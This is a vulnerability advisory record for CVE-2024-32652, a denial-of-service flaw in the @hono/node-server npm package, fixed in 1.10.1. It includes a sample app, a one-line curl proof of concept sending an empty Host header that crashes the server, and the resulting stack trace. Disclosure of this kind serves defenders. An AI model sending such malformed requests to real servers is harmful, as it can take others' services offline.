advisory_id: npm/@hono/node-server/CVE-2024-32652
datasource_id: gitlab_importer_v2/npm/@hono/node-server/CVE-2024-32652
datasource_url: https://gitlab.com/gitlab-org/advisories-community/-/blob/main/npm/@hono/node-server/CVE-2024-32652.yml
aliases:
  - CVE-2024-32652
  - GHSA-hgxw-5xg3-69jx
summary: |
  @hono/node-server has Denial of Service risk when receiving Host header that cannot be parsed
  The application hangs when receiving a Host header with a value that `@hono/node-server` can't handle well. Invalid values are those that cannot be parsed by the `URL` as a hostname such as an empty string, slashes `/`, and other strings.

  For example, if you have a simple application:

  ```ts
  import { serve } from '@hono/node-server'
  import { Hono } from 'hono'

  const app = new Hono()

  app.get('/', (c) => c.text('Hello'))

  serve(app)
  ```

  Sending a request with a Host header with an empty value to it:

  ```
  curl localhost:3000/ -H "Host: "
  ```

  The results:

  ```
  node:internal/url:775
  this.#updateContext(bindingUrl.parse(input, base));
  ^

  TypeError: Invalid URL
  at new URL (node:internal/url:775:36)
  at newRequest (/Users/yusuke/work/h/159/node_modules/@hono/node-server/dist/index.js:137:17)
  at Server.<anonymous> (/Users/yusuke/work/h/159/node_modules/@hono/node-server/dist/index.js:399:17)
  at Server.emit (node:events:514:28)
  at Server.emit (node:domain:488:12)
  at parserOnIncoming (node:_http_server:1143:12)
  at HTTPParser.parserOnHeadersComplete (node:_http_common:119:17) {
  code: 'ERR_INVALID_URL',
  input: 'http:///'
  }
  ```
impacted_packages:
  - purl: pkg:npm/%40hono/node-server
    affected_versions: vers:npm/>=1.3.0|<1.10.1
    fixed_versions: vers:npm/1.10.1
    fixed_in_commits: []
    introduced_in_commits: []
severities:
  - score:
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H
    published_at: None
    url: https://gitlab.com/gitlab-org/advisories-community/-/blob/main/npm/@hono/node-server/CVE-2024-32652.yml
weaknesses:
  - CWE-1035
  - CWE-937
references:
  - url: https://github.com/honojs/node-server
    reference_type:
    reference_id:
  - url: https://github.com/honojs/node-server/commit/306d98f02a8671a0a1fb91ac8fe7e281690c05af
    reference_type:
    reference_id:
  - url: https://github.com/honojs/node-server/issues/159
    reference_type:
    reference_id:
  - url: https://github.com/honojs/node-server/issues/161
    reference_type:
    reference_id:
  - url: https://github.com/honojs/node-server/security/advisories/GHSA-hgxw-5xg3-69jx
    reference_type:
    reference_id:
  - url: https://nvd.nist.gov/vuln/detail/CVE-2024-32652
    reference_type:
    reference_id: CVE-2024-32652
  - url: https://github.com/advisories/GHSA-hgxw-5xg3-69jx
    reference_type:
    reference_id: GHSA-hgxw-5xg3-69jx
